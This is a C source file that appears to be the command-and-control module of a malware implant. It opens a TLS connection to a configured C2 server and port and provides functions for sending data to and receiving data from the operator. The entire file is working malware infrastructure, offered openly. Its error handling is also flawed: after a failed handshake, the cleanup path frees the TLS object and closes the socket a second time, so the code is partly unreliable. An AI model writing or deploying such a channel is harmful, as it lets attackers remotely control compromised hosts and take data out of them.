#include "c2_communication_fixed.h"
#include "payload_config.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

// Global variables
static int c2_socket = -1;
static SSL_CTX *ssl_ctx = NULL;
static SSL *ssl = NULL;

// Function prototypes
static int init_ssl();
static int connect_to_c2();
static int send_data(const char *data, size_t len);
static int receive_data(char *buffer, size_t len);

int init_c2_communication() {
    printf("Initializing C2 communication...\n");

    // Initialize SSL
    if (init_ssl() != 0) {
        printf("Failed to initialize SSL\n");
        return -1;
    }

    // Connect to C2 server
    if (connect_to_c2() != 0) {
        printf("Failed to connect to C2 server\n");
        cleanup_c2_communication();
        return -1;
    }

    printf("Successfully connected to C2 server: %s:%d\n", C2_SERVER, C2_PORT);
    return 0;
}

int send_c2_data(const char *data, size_t len) {
    if (c2_socket == -1 || !ssl) {
        printf("C2 communication not initialized\n");
        return -1;
    }

    return send_data(data, len);
}

int receive_c2_data(char *buffer, size_t len) {
    if (c2_socket == -1 || !ssl) {
        printf("C2 communication not initialized\n");
        return -1;
    }

    return receive_data(buffer, len);
}

void cleanup_c2_communication() {
    printf("Cleaning up C2 communication...\n");

    if (ssl) {
        SSL_shutdown(ssl);
        SSL_free(ssl);
    }

    if (ssl_ctx) {
        SSL_CTX_free(ssl_ctx);
    }

    if (c2_socket != -1) {
        close(c2_socket);
    }

    EVP_cleanup();
    ERR_free_strings();
}

static int init_ssl() {
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();

    ssl_ctx = SSL_CTX_new(SSLv23_client_method());
    if (!ssl_ctx) {
        ERR_print_errors_fp(stderr);
        return -1;
    }

    return 0;
}

static int connect_to_c2() {
    // Create socket
    c2_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (c2_socket == -1) {
        perror("socket");
        return -1;
    }

    // Set up server address
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(C2_PORT);

    // Convert server address
    if (inet_pton(AF_INET, C2_SERVER, &server_addr.sin_addr) <= 0) {
        perror("inet_pton");
        close(c2_socket);
        return -1;
    }

    // Connect to server
    if (connect(c2_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        perror("connect");
        close(c2_socket);
        return -1;
    }

    // Create SSL object
    ssl = SSL_new(ssl_ctx);
    if (!ssl) {
        ERR_print_errors_fp(stderr);
        close(c2_socket);
        return -1;
    }

    SSL_set_fd(ssl, c2_socket);

    // Perform SSL handshake
    if (SSL_connect(ssl) <= 0) {
        ERR_print_errors_fp(stderr);
        SSL_free(ssl);
        close(c2_socket);
        return -1;
    }

    return 0;
}

static int send_data(const char *data, size_t len) {
    int bytes_sent = SSL_write(ssl, data, len);
    if (bytes_sent <= 0) {
        ERR_print_errors_fp(stderr);
        return -1;
    }

    return bytes_sent;
}

static int receive_data(char *buffer, size_t len) {
    int bytes_received = SSL_read(ssl, buffer, len - 1);
    if (bytes_received <= 0) {
        int ssl_error = SSL_get_error(ssl, bytes_received);
        if (ssl_error == SSL_ERROR_ZERO_RETURN) {
            printf("C2 server closed the connection\n");
        } else {
            ERR_print_errors_fp(stderr);
        }
        return -1;
    }

    buffer[bytes_received] = '\0';
    return bytes_received;
}